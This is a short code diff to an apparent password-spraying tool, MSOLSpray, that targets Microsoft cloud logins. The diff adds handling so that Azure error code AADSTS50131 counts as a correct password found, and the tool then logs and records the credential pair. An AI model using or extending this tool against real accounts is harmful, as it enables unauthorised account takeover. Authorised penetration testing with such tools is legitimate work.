@@ -137,6 +137,10 @@ class MSOLSpray:
                     self.valid_logins.append(f'{email} : {self.password}')
                     self.valid_emails.append(email)
 
+                elif 'AADSTS50131' in error:
+                    log.critical(f'{email} : {self.password} - Correct password found!!!!')
+                    self.valid_logins.append(f'{email} : {self.password}')
+                    self.valid_emails.append(email)
                 else:
                     # Unknown errors
                     log.error(f'Got an error we haven\'t seen yet for user {email}')
